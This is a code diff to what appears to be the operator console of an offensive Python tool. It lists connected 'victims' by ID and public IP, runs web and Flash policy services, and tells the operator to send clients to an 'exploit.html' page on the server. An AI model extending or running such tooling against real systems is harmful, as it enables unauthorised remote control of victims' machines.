@@ -34,7 +34,7 @@ class Shell():
 	############################################################################
 	def getVictims(self):
 		for server in self.ENGINE.SERVERS:
-			if server.TYPE=="COMMAND Server":
+			if server.TYPE=="Command Server":
 				if server.HANDLER:
 					return server.HANDLER.VICTIMS
 				else:
@@ -72,7 +72,7 @@ class Shell():
 				print "todo"
 			elif parts[1].upper()=="LIST":
 				print "List: The list command lists objects currently loaded."
-				print "   list clientss\t\tLists all clients connected to the server."
+				print "   list clients\t\tLists all clients connected to the server."
 				print "   list services\tLists all running services."
 				print "   list connectors\tLists all succesfully exposed endpoints."
 				
@@ -97,9 +97,14 @@ class Shell():
 		if item.upper()=="CLIENTS":
 			victims = self.getVictims() # refresh list
 			x = 0
-			for victim in victims:
-				print "   " + str(x) + ".   " + victim.VIC_ID + "\t\t" + victim.PUBLIC_IP
-				x=x+1
+			print "   ID\tClient ID\t\t\tAddress"
+			print "--------------------------------------------------------------------------"
+			if victims == None:
+				print "No clients connected yet: point them to http://yourserver/exploit.html?type=cmd&ci=ip-of-client"
+			else:
+				for victim in victims:
+					print "   " + str(x) + ".   " + victim.VIC_ID + "\t\t" + victim.PUBLIC_IP
+					x=x+1
 		elif item.upper() =="SERVICES":
 			print "Currently running services:"
 			x = 0
@@ -207,8 +212,20 @@ class Engine():
 	#end def
 #end class
 
+def main():
+	parser = OptionParser(usage = '%prog --proto=PROTOCOL --type=CALLBACK_TYPE')
+	parser.add_option('--no-web', action="store_false", dest='runweb', default=True, help='Do not run the internal web service (port 80).')
+	parser.add_option('--no-flash', action="store_false", dest='runflash', default=True, help='Do not run the internal flash policy service (port 843).')
+	parser.add_option('-v', dest='verbose', default=2, help='Verbosity level, default is 2, set to 0 if you like a lot of output.')
+	opts, args = parser.parse_args()
+	
+	
+	x = Engine(int(opts.verbose),"screen")
+	x.runServers(True,opts.runweb,opts.runflash,"ALL")
+	s = Shell(x)
+#end def
+if __name__ == '__main__':
+    main()
 
-x = Engine(0,"screen")
-x.runServers(True,True,True,"ALL")
-s = Shell(x)
+
 
